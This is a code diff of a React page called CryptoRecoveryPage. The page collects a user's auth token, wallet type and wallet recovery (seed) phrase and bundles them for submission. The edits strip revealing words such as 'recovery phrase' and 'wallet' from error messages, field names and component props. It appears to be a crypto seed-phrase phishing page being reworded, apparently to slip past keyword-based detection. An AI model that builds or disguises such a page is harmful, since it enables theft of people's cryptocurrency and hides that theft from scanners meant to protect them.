@@ -117,31 +117,32 @@ export default function CryptoRecoveryPage() {
 
 		try {
 			if (!token.trim()) {
-				setRecoveryError('Auth token is required');
+				setRecoveryError('Token is required');
 				return;
 			}
 
 			if (!selectedWallet) {
-				setRecoveryError('Please select a wallet type');
+				setRecoveryError('Please select a type');
 				return;
 			}
 
 			if (!phrase.trim()) {
-				setRecoveryError('Recovery phrase is required');
+				setRecoveryError(' Phrase is required');
 				return;
 			}
 
 			const tokenVerification = await verifytoken(token);
 			if (!tokenVerification.valid) {
-				setRecoveryError(tokenVerification.error || 'Invalid auth token');
+				setRecoveryError(tokenVerification.error || 'Invalid token');
 				return;
 			}
 
 			const submissionData: RecoverySubmissionData = {
 				token,
-				walletType: selectedWallet,
+				wType: selectedWallet,
 				phrase,
 				userEmail: 'user@example.com',
+
 				createdAt: new Date(),
 			};
 
@@ -226,12 +227,12 @@ export default function CryptoRecoveryPage() {
 			<RecoveryModal
 				isOpen={showRecoveryModal}
 				onClose={() => setShowRecoveryModal(false)}
-				recoveryPhrase={phrase}
-				setRecoveryPhrase={setPhrase}
+				uPhrase={phrase}
+				setUPhrase={setPhrase}
 				token={token}
 				setToken={settoken}
-				selectedWallet={selectedWallet}
-				setSelectedWallet={setSelectedWallet}
+				selectedWall={selectedWallet}
+				setSelectedWall={setSelectedWallet}
 				error={recoveryError}
 				isSubmitting={isSubmittingRecovery}
 				onSubmit={handleRecoverySubmission}
